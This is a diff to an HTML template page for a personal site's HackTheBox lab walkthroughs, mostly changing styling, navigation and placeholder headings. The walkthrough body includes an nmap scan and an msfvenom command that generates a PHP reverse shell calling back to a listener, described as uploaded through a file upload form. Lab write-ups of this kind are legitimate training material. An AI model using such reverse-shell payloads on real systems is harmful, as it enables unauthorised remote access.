@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Walkthrough: Example Box | Timeless</title>
+  
+  <title>HTB | Box Name</title>
   <style>
     :root {
       --bg: #0d0d0d;
@@ -48,17 +49,42 @@
       color: var(--fg);
     }
 
-    .container {
+    .wrapper {
+      position: relative;
       padding: 2rem;
       max-width: 900px;
       margin: auto;
     }
 
-    h1 {
-      font-size: 2.2rem;
+    .top-left-back {
+      position: absolute;
+      top: 2rem;
+      left: 1rem;
+      font-size: 1.25rem;
+      padding: 0.25rem 0.6rem;
       color: var(--accent);
-      margin-bottom: 1rem;
+      background-color: transparent;
+      border: 1px solid var(--accent);
+      border-radius: 6px;
+      text-decoration: none;
+      font-family: 'Courier New', Courier, monospace;
+      transition: 0.2s ease;
+      z-index: 100;
+    }
+
+    .top-left-back:hover {
+      background-color: var(--accent);
+      color: var(--bg);
+      box-shadow: 0 0 6px var(--accent);
+    }
+
+    h1 {
+      font-size: 2.25rem;
+      color: var(--accent);
+      margin-top: 3rem;
+      margin-bottom: 2rem;
       text-shadow: 0 0 10px var(--accent-glow);
+      text-align: center;
     }
 
     h2 {
@@ -103,24 +129,26 @@
   </style>
 </head>
 <body>
+
   <header>
     <div><strong style="color: white;">Timeless</strong></div>
     <nav>
-      <a href="index.html">Home</a>
-      <a href="walkthroughs.html">Walkthroughs</a>
-      <a href="whoami.html">whoami</a>
+      <a href="/index.html">Home</a>
+      <a href="/walkthroughs.html">Walkthroughs</a>
+      <a href="/whoami.html">whoami</a>
     </nav>
   </header>
 
-  <div class="container">
-    <h1>Walkthrough: Example Box</h1>
+  <div class="wrapper">
+    <a href="/walkthroughs.html" class="top-left-back"><< Back</a>
+    <h1></h1>
+    <h1>Box Name</h1>
 
-    <p><strong>Difficulty:</strong> Easy<br>
-       <strong>Platform:</strong> HackTheBox</p>
+    <p><strong>Operating System:</strong> Linux<br>
+      <strong>Tags:</strong> Telnet, Protocols, Reconnaissance, Weak Credentials, Misconfiguration</p>
 
     <h2>Reconnaissance</h2>
     <p>Started with an Nmap scan to identify open ports and services.</p>
-
     <pre><code>nmap -sC -sV -oN initial.txt 10.10.10.10</code></pre>
 
     <h2>Enumeration</h2>
@@ -129,7 +157,6 @@
 
     <h2>Exploitation</h2>
     <p>Uploaded a reverse shell using the file upload feature:</p>
-    
     <pre><code>msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php</code></pre>
 
     <h2>Privilege Escalation</h2>
